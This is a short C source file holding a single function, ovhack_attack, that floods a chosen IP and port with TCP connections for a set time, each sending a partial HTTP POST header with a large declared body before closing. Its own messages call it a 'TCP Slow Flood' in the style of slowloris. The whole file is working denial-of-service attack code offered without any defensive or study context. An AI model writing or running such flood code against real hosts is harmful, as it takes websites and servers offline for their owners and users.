#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

void ovhack_attack(const char *target_ip, int port, int duration) {
    printf("[C] Starting OVHACK TCP Slow Flood on %s:%d for %d seconds\n", target_ip, port, duration);

    time_t end = time(NULL) + duration;

    while (time(NULL) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) {
            perror("[C] Socket error");
            continue;
        }

        struct sockaddr_in target;
        memset(&target, 0, sizeof(target));
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(target_ip);

        if (connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
            close(sock);
            continue;
        }

        // Send slow POST headers
        char buffer[1024];
        snprintf(buffer, sizeof(buffer),
                 "POST / HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: SlowFlood\r\n"
                 "Content-Length: 100000\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n\r\n", target_ip);

        send(sock, buffer, strlen(buffer), 0);
        usleep(50000); // wait 50ms to simulate "slowloris"

        close(sock);
    }

    printf("[C] OVHACK attack finished\n");
}
